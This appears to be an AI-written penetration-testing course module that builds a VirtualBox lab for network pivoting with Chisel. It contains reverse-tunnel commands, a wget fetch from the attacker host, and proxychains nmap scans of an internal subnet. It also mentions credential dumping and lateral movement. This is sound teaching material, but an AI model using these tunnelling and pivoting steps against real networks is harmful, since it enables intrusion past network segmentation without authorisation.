Objective: Build a strong practical foundation in networking, operating systems, and offensive methodology. By the end of this module students will be able to: understand and manipulate TCP/IP and OSI layers, perform subnetting and VLAN analysis, enumerate and exploit OS weaknesses, perform post-exploitation, and follow a structured pentesting methodology mapped to MITRE ATT&CK and the Cyber Kill Chain.



# Module 01 ‚Äî Core Foundations: Pivoting Lab Setup

## Objective
Build a **strong practical foundation** in networking, operating systems, and offensive methodology. By the end of this module, students will be able to:

- Understand and manipulate **TCP/IP and OSI layers**.
- Perform **subnetting and VLAN analysis**.
- Enumerate and exploit **operating system weaknesses**.
- Conduct **post-exploitation** and **pivoting** using tunneling tools like **Chisel**.
- Follow a structured **penetration testing methodology** mapped to **MITRE ATT&CK** and the **Cyber Kill Chain**.

***

## Lab Overview: Network Pivoting with Chisel
You‚Äôll build a **multi-network lab environment** using **VirtualBox** to simulate network isolation and penetration testing scenarios.

### Machines Setup
| Role | OS | Purpose |
|------|----|----------|
| Attacker | Kali Linux | Primary attack and control machine |
| Pivot | Ubuntu Linux | Dual-homed host bridging two NAT networks |
| Internal Linux Host | Debian/Ubuntu | Target in internal subnet |
| Internal Windows Host | Windows 10 | Target in internal subnet |

***

## Step 1 ‚Äî VirtualBox Network Configuration
1. **Create two NAT Networks**:
   - **NATNetwork1:** `10.0.10.0/24` ‚Äî attacker and pivot connected here.
   - **NATNetwork2:** `10.0.20.0/24` ‚Äî pivot, internal Linux, and Windows hosts connected here.

2. **Configure adapters:**
   - **Kali:** Single adapter ‚Üí NATNetwork1.
   - **Pivot (Ubuntu):** Two adapters ‚Üí NATNetwork1 and NATNetwork2 (dual NIC).
   - **Linux target:** Single adapter ‚Üí NATNetwork2.
   - **Windows target:** Single adapter ‚Üí NATNetwork2.

üëâ Verify connectivity with `ping`:
- Kali ‚Üî Pivot ‚úÖ
- Pivot ‚Üî Internal hosts ‚úÖ
- Kali ‚Üî Internal hosts ‚ùå (blocked ‚Äî will pivot later)

***

## Step 2 ‚Äî Configure the Kali Attacker Machine

1. **Install tools:**
   ```bash
   sudo apt update && sudo apt install chisel proxychains4 -y
   ```

2. **Edit proxychains configuration:**
   ```bash
   sudo nano /etc/proxychains4.conf
   ```
   Add at the bottom:
   ```
socks5  127.0.0.1 1080
   ```

3. Start listening for reverse traffic:
   ```bash
   ./chisel server -p 8080 --reverse
   ```

   This will allow reverse connections from the pivot host.

***

## Step 3 ‚Äî Upload and Run Chisel on Pivot Host (Ubuntu)

1. **Transfer Chisel:**
   Use a simple Python HTTP server on Kali:
   ```bash
   python3 -m http.server 8000
   ```
   Then on the pivot:
   ```bash
   wget http://<kali_ip>:8000/chisel
   chmod +x chisel
   ```

2. **Run Chisel Client (Reverse Connection):**
   ```bash
   ./chisel client <kali_ip>:8080 R:socks
   ```
   This creates a SOCKS proxy from pivot ‚Üí attacker.

***

## Step 4 ‚Äî Verify Proxy and Pivot Access

1. **Check connectivity** from Kali through proxychains:
   ```bash
   proxychains nmap -sT 10.0.20.0/24
   ```
   You should see open ports of the internal Linux and Windows machines.

2. Your traffic is now tunneled through the Pivot host using Chisel.

***

## Step 5 ‚Äî Advanced: Double Pivot (Optional)

To demonstrate **deep network traversal**, you can add another internal machine on a third subnet and chain Chisel tunnels, as described in HTB‚Äôs double pivot guide. This allows multi-hop access similar to real enterprise environments.

***

## Step 6 ‚Äî Post-Exploitation Workflow

Use this setup to practice:
- **Enumerating internal networks** with tools like `nmap` and `smbclient`.
- **Credential dumping** and **lateral movement** simulations.
- Applying **MITRE ATT&CK stages**, from Initial Access to Execution and Persistence.

***

## Step 7 ‚Äî Reflection & Documentation

Document:
- Network map diagrams.
- Chisel commands used.
- Verification results (connectivity tests, successful scans).
- Lessons learned about traffic tunneling and segmentation.

***

### Summary
After completing this module, you‚Äôll understand:
- How to configure and isolate virtual networks.
- The purpose and power of network pivoting.
- How tools like **Chisel** enable controlled tunneling and SOCKS proxy access.
- How pivoting integrates into the **post-exploitation** stage of a penetration test.

If you tell me whether this module is for your **personal lab** or **structured training curriculum**, I can tailor the terminology, exercises, and difficulty level accordingly.
